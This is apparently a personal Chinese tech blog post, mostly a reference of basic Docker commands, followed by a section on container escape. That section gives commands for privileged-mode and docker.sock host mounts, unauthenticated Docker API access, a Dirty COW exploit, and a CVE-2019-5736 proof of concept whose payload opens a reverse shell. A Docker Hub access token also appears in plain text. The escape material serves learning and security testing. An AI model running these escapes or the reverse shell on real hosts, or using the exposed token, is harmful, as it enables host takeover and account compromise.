<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="mayylu">



    <meta name="description" content="学习是一种生活态度">



<title>Docker 实践 | mayylu&#39;s blog</title>



    <link rel="icon" href="/vue.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 5.4.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">mayylu&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">mayylu&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">Docker 实践</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">mayylu</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">十一月 29, 2022&nbsp;&nbsp;</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/">云安全</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为22招新了解一点关于docker的使用，比我想得要简单许多</p>
<span id="more"></span>

<h2 id="docker-基础命令"><a href="#docker-基础命令" class="headerlink" title="docker 基础命令"></a>docker 基础命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">启动docker</span></span><br><span class="line">systemctl start docker</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">关闭docker</span></span><br><span class="line">systemctl stop docker</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">重启docker</span></span><br><span class="line">systemctl restart docker</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">docker设置随服务启动而自启动</span></span><br><span class="line">systemctl enable docker</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">查看docker 版本号信息</span></span><br><span class="line">docker version</span><br><span class="line">docker info</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="docker-镜像命令"><a href="#docker-镜像命令" class="headerlink" title="docker 镜像命令"></a>docker 镜像命令</h2><h3 id="Docker-Registry"><a href="#Docker-Registry" class="headerlink" title="Docker Registry"></a>Docker Registry</h3><p>Docker Registry 是用于存储和管理 Docker 镜像的服务。它可以是公共的，也可以是私有的，具体取决于组织或个人的需求。默认使用的镜像库为 <strong>Docker Hub</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker login -u eksclustergames #切换镜像库</span><br><span class="line">Password: dckr_pat_YtncV-R85mAAAAAAAACo</span><br><span class="line"></span><br><span class="line">docker tag local-image:tag your-dockerhub-username/your-image:tag #标记镜像</span><br><span class="line">docker push your-dockerhub-username/your-image:tag #上传镜像</span><br></pre></td></tr></table></figure>


<h3 id="image管理"><a href="#image管理" class="headerlink" title="image管理"></a>image管理</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">搜索开源镜像</span></span><br><span class="line">docker search redis</span><br><span class="line">NAME                               DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">redis                              Redis is an open source key-value store that…   11599     [OK]       </span><br><span class="line">bitnami/redis                      Bitnami Redis Docker Image                      237                  [OK]</span><br><span class="line">redislabs/redisinsight             RedisInsight - The GUI for Redis                72                   </span><br><span class="line">redislabs/redisearch               Redis With the RedisSearch module pre-loaded…   56                   </span><br><span class="line">redislabs/rejson                   RedisJSON - Enhanced JSON data type processi…   50                   </span><br><span class="line">bitnami/redis-sentinel             Bitnami Docker Image for Redis Sentinel         42                   [OK]</span><br><span class="line">redislabs/redis                    Clustered in-memory database engine compatib…   35                   </span><br><span class="line">redislabs/redismod                 An automated build of redismod - latest Redi…   27                   [OK]</span><br><span class="line">redis/redis-stack                  redis-stack installs a Redis server with add…   24  </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">限制搜索镜像</span>                 </span><br><span class="line">docker search --filter=STARS=9000 mysql </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">拉取镜像不加tag(版本号) 即拉取docker仓库中 该镜像的最新版本latest 加:tag 则是拉取指定版本</span></span><br><span class="line">docker pull 镜像名 </span><br><span class="line">docker pull 镜像名:tag</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">查看自己服务器中docker 镜像列表</span></span><br><span class="line">docker images</span><br><span class="line">REPOSITORY                       TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">stackoverflow1                   latest    1a369ff8523c   23 hours ago   368MB</span><br><span class="line">ctftraining/upload               latest    6d90e144c982   2 months ago   370MB</span><br><span class="line">ctftraining/qwb_2019_supersqli   latest    474a1967b7e5   2 months ago   370MB</span><br><span class="line">ctftraining/rce1                 latest    64239e5a3f11   2 months ago   370MB</span><br><span class="line">h1ve-main                        latest    735f474f81ea   2 months ago   920MB</span><br><span class="line">mariadb                          10.4      0552982c09ae   3 months ago   404MB</span><br><span class="line">redis                            4         191c4017dcdd   2 years ago    89.3MB</span><br><span class="line">d0g3/h1ve-frp                    latest    5e0d10177d43   2 years ago    35.1MB</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">删除镜像 当前镜像没有被任何容器使用才可以删除</span></span><br><span class="line"><span class="meta">#</span><span class="bash">删除一个</span></span><br><span class="line">docker rmi -f 镜像名/镜像ID</span><br><span class="line"><span class="meta">#</span><span class="bash">删除多个 其镜像ID或镜像用用空格隔开即可</span> </span><br><span class="line">docker rmi -f 镜像名/镜像ID 镜像名/镜像ID 镜像名/镜像ID</span><br><span class="line"><span class="meta">#</span><span class="bash">删除全部镜像  -a 意思为显示全部, -q 意思为只显示ID</span></span><br><span class="line">docker rmi -f $(docker images -aq)</span><br><span class="line"><span class="meta">#</span><span class="bash">强制删除镜像</span></span><br><span class="line">docker image rm 镜像名称/镜像ID</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="制作image"><a href="#制作image" class="headerlink" title="制作image"></a>制作image</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker history IMAGEname #会显示镜像的构建历史</span><br><span class="line">docker history --no-trunc  #不截断输出</span><br><span class="line">docker save madhuakula/k8s-goat-hidden-in-layers -o hidden.tar #将 Docker 镜像打包成一个可传输的压缩文件（一般用于调查取证）</span><br></pre></td></tr></table></figure>
<h4 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t ubuntu-with-vi-dockerfile .</span><br><span class="line"><span class="meta">#</span><span class="bash">运行docker build命令，-t将新镜像命名为ubuntu-with-vi-dockerfile，命令末尾的．指明build context为当前目录</span></span><br><span class="line">Docker默认会从build context中查找Dockerfile文件</span><br></pre></td></tr></table></figure>




<h2 id="docker-容器命令"><a href="#docker-容器命令" class="headerlink" title="docker 容器命令"></a>docker 容器命令</h2><h3 id="docker容器管理"><a href="#docker容器管理" class="headerlink" title="docker容器管理"></a>docker容器管理</h3><h4 id="docker容器状态查询"><a href="#docker容器状态查询" class="headerlink" title="docker容器状态查询"></a>docker容器状态查询</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看正在运行容器列表</span></span><br><span class="line">docker ps</span><br><span class="line"><span class="meta">#</span><span class="bash">查看所有容器 -----包含正在运行 和已停止的</span></span><br><span class="line">docker ps -a</span><br><span class="line"><span class="meta">#</span><span class="bash"> Up (运行时间)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Created (已创建，但尚未启动)</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Exited (已退出时间)</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Restarting (重启时间)</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Paused (已暂停)</span></span><br></pre></td></tr></table></figure>

<h4 id="docker容器状态管理"><a href="#docker容器状态管理" class="headerlink" title="docker容器状态管理"></a>docker容器状态管理</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#更换容器名</span></span><br><span class="line">docker rename 容器ID/容器名 新容器名</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看日志</span></span><br><span class="line">docker container logs 容器ID/容器名</span><br><span class="line"></span><br><span class="line"><span class="comment">#停止运行的容器 </span></span><br><span class="line">docker stop 容器名/容器ID</span><br><span class="line"><span class="comment">#重启容器</span></span><br><span class="line">docker restart 容器ID/容器名</span><br><span class="line"><span class="comment">#启动容器</span></span><br><span class="line">docker start 容器ID/容器名</span><br><span class="line"><span class="comment">#kill 容器</span></span><br><span class="line">docker <span class="built_in">kill</span> 容器ID/容器名</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除一个容器</span></span><br><span class="line">docker rm -f 容器名/容器ID</span><br><span class="line"><span class="comment">#删除多个容器 空格隔开要删除的容器名或容器ID</span></span><br><span class="line">docker rm -f 容器名/容器ID 容器名/容器ID 容器名/容器ID</span><br><span class="line"><span class="comment">#删除全部容器</span></span><br><span class="line">docker rm -f $(docker ps -aq)</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看容器详细信息</span></span><br><span class="line">sudo docker inspect 容器名/容器ID</span><br><span class="line"><span class="comment">#而其中的MergedDir就是容器挂载点，即容器在宿主机上的目录位置</span></span><br></pre></td></tr></table></figure>
<h3 id="docker容器内外交互"><a href="#docker容器内外交互" class="headerlink" title="docker容器内外交互"></a>docker容器内外交互</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">进入容器方式一 这里咱就进入 前面的 redis001容器</span></span><br><span class="line">docker exec -it 容器名/容器ID /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash">退出为<span class="built_in">exit</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">从容器内拷出文件</span></span><br><span class="line">docker cp 容器ID/名称: 容器内路径  容器外路径</span><br><span class="line"><span class="meta">#</span><span class="bash">从外部 拷贝文件到容器内</span></span><br><span class="line">docker  cp 容器外路径 容器ID/名称: 容器内路径</span><br><span class="line">docker cp /www/runoob ad74b2b4bb42:/var/www/html/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">挂载</span></span><br><span class="line">docker run -it -v /root/work/docker:/root/hzbtest tomcat:7.0 /bin/bash</span><br><span class="line">                  主机目录           容器目录       容器名</span><br><span class="line"><span class="meta">#</span><span class="bash">获取容器的日志</span></span><br><span class="line"><span class="meta">#</span><span class="bash">--tail n：从尾部开始显示n行日志</span></span><br><span class="line">root@VM-12-3-ubuntu:/# docker logs --tail=1   a30f8ce2b28c</span><br><span class="line"> 220.196.160.96 - - [19/Feb/2023:08:20:55 +0000] &quot;GET /?1=1 HTTP/1.1&quot; 200 543 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.49&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">注意docker里默认使用协调世界时（世界统一时间），比服务器使用的北京时间慢大概8个小时</span></span><br></pre></td></tr></table></figure>

<h3 id="docker-利用镜像创建容器"><a href="#docker-利用镜像创建容器" class="headerlink" title="docker 利用镜像创建容器"></a>docker 利用镜像创建容器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p &quot;0.0.0.0:pub_port:9999&quot; -h &quot;helloworld&quot; --name=&quot;helloworld&quot; helloworld</span><br><span class="line">                        主机的端口 容器的端口                      &lt;容器名称&gt;  &lt;镜像名称&gt;</span><br></pre></td></tr></table></figure>

<h3 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h3><p>docker compose up</p>
<h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h2><p>容器与宿主机之间通过Namespace 和Cgroups进行隔离</p>
<p>Namespaces进程命名空间 (PID namespace)：每个容器都在自己的 PID 命名空间中运行，容器之间的进程不会互相干扰。比如，容器 A 的进程 ID 可能是 1，而容器 B 的进程 ID 也可以是 1，但它们是不同的进程。网络命名空间 (Network namespace)：每个容器都有独立的网络堆栈，包括网络接口、IP 地址和路由表。容器之间的网络通信是隔离的，只有通过明确的桥接或端口映射才能互通。文件系统命名空间 (Mount namespace)：每个容器的文件系统视图是独立的，容器内部的文件更改不会影响其他容器。</p>
<p><strong>Cgroup</strong>(control group)，用于限制、优先级调度和监控容器的资源使用（如 CPU、内存、磁盘 IO 等）。</p>
<p>但是许多危险操作或者漏洞导致攻击者可以从容器里边逃逸到宿主机上。常用的逃逸手法包含四类：<strong>危险配置</strong>、<strong>危险挂载</strong>、<strong>组件漏洞</strong>、<strong>内核漏洞</strong></p>
<h3 id="判断当前机器是否为docker容器环境"><a href="#判断当前机器是否为docker容器环境" class="headerlink" title="判断当前机器是否为docker容器环境"></a>判断当前机器是否为docker容器环境</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -al / #根目录下存在.dockerenv文件</span><br><span class="line">cat /proc/1/cgroup #存在docker字段则是在docker容器中</span><br><span class="line">cat /proc/1/environ</span><br></pre></td></tr></table></figure>
<h3 id="逃逸手法"><a href="#逃逸手法" class="headerlink" title="逃逸手法"></a>逃逸手法</h3><h4 id="危险配置"><a href="#危险配置" class="headerlink" title="危险配置"></a>危险配置</h4><h5 id="privileged参数逃逸"><a href="#privileged参数逃逸" class="headerlink" title="privileged参数逃逸"></a>privileged参数逃逸</h5><p>privileged是Docker容器的一个选项，用于授予容器内的进程对主机系统的更高权限，容器启动时如果添加了–privileged参数则会具备<strong>全部Capabilities</strong>，容器可以访问主机所有device以及具有mount操作的权限。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/status |grep Cap #判断当前容器是否通过特权模式起（000000xfffffffff代表为特权模式起）</span><br><span class="line">fdisk -l #找到正确的设备路径</span><br><span class="line">mkdir /home/test</span><br><span class="line">mount /dev/vda1 /test #将宿主机文件挂载到 /test 目录下</span><br><span class="line">chroot /home/test #chroot改变根目录</span><br></pre></td></tr></table></figure>
<p>其他还有<br>cap_sys_module特权表示允许加载内核模块，直接新建一个命令执行的模块即可拿到宿主机权限<br>利用CAP_DAC_READ_SEARCH+CAP_DAC_OVERRIDE特权的应用方法，对宿主机系统中存在的文件进行任意读写<br>cap_sys_admin权限下也有几种方式可以逃逸，常见的为notify_on_release机制逃逸、重写devices.allow逃逸等</p>
<h5 id="Docker-Registry-API-18093未授权访问"><a href="#Docker-Registry-API-18093未授权访问" class="headerlink" title="Docker Registry API 18093未授权访问"></a>Docker Registry API 18093未授权访问</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.200.88.6:18093/v2/_catalog  # 获取仓库列表</span><br><span class="line">&#123;&quot;repositories&quot;:[&quot;madhuakula/k8s-goat-users-repo&quot;]&#125;</span><br><span class="line"></span><br><span class="line">curl http://10.200.88.6:18093/v2/madhuakula/k8s-goat-users-repo/tags/list #获取指定仓库中镜像的tags列表</span><br><span class="line">&#123;&quot;name&quot;:&quot;madhuakula/k8s-goat-users-repo&quot;,&quot;tags&quot;:[&quot;latest&quot;]&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="Docker-Remote-API-2375未授权访问"><a href="#Docker-Remote-API-2375未授权访问" class="headerlink" title="Docker Remote API 2375未授权访问"></a>Docker Remote API 2375未授权访问</h5><p>Docker remote api本身用于通过请求api来执行docker命令，如果开放对外访问，那么和挂载docker.sock的情形类似</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">列出容器信息</span></span><br><span class="line">curl http://&lt;target&gt;:2375/containers/json</span><br><span class="line"><span class="meta">#</span><span class="bash">查看容器</span></span><br><span class="line">docker -H tcp://&lt;target&gt;:2375 ps -a</span><br><span class="line"><span class="meta">#</span><span class="bash">后面就是挂载了，就不写了</span></span><br></pre></td></tr></table></figure>

<h4 id="危险挂载"><a href="#危险挂载" class="headerlink" title="危险挂载"></a>危险挂载</h4><p>容器挂载不当导致的逃逸根本原因在于业务需求或使用者图方便把危险目录直接挂载到容器中。</p>
<p>例：使用者将宿主机/var/run/docker.sock文件挂载到容器中，目的是能在容器中也有操作docker的权限，那么可以使用docker在当前容器中运行一个新容器并挂载宿主机根路径</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mount</span><br><span class="line">find / -name docker.sock </span><br><span class="line">apt-get update </span><br><span class="line">apt-get install docker.io #在当前容器内安装docker</span><br><span class="line"></span><br><span class="line">docker -H unix:///host/var/run/docker.sock info #与 Docker Daemon 之间通信,查看宿主机docker信息</span><br><span class="line">docker -H unix:///host/var/run/docker.sock run -v /:/test -it ubuntu:14.04 /bin/bash #在当前容器中运行一个新容器并挂载宿主机根路径</span><br><span class="line"><span class="meta">#</span><span class="bash">宿主机-&gt;当前容器-&gt;新容器</span></span><br></pre></td></tr></table></figure>

<h4 id="linux自身的内核漏洞"><a href="#linux自身的内核漏洞" class="headerlink" title="linux自身的内核漏洞"></a>linux自身的内核漏洞</h4><h5 id="Dirty-Cow"><a href="#Dirty-Cow" class="headerlink" title="Dirty Cow"></a>Dirty Cow</h5><p>此漏洞是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uname -r #查看内核版本</span><br><span class="line">cat /etc/os-release #查看容器操作系统详细信息 </span><br><span class="line">uname -a #查看宿主机内核信息</span><br><span class="line">cd /dirtycow-vdso</span><br><span class="line">make</span><br><span class="line">./0xdeadbeef 192.168.59.145:6666</span><br></pre></td></tr></table></figure>

<h4 id="Docker-CVE"><a href="#Docker-CVE" class="headerlink" title="Docker CVE"></a>Docker CVE</h4><p>CVE-2019-5736 docker-runc 逃逸</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Frichetten/CVE-2019-5736-PoC</span><br><span class="line">vi main.gopayload = <span class="string">&quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/192.168.172.136/12345 0&gt;&amp;1&quot;</span></span><br><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br><span class="line">chmod 777 main</span><br><span class="line">./main</span><br></pre></td></tr></table></figure>
<p>CVE-2020–15257 container-shim 逃逸</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/net/unix | grep <span class="string">&#x27;containerd-shim&#x27;</span> <span class="comment">#判断是否使用host模式</span></span><br><span class="line"><span class="comment">#https://github.com/cdk-team/CDK/releases</span></span><br></pre></td></tr></table></figure>
        </div>

        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/docker/"># docker</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/12/03/bin/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/">汇编基础</a>
            
            
            <a class="next" rel="next" href="/2022/11/04/java/basis/java_Swing_GUI/">java_Swing_GUI</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© mayylu | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>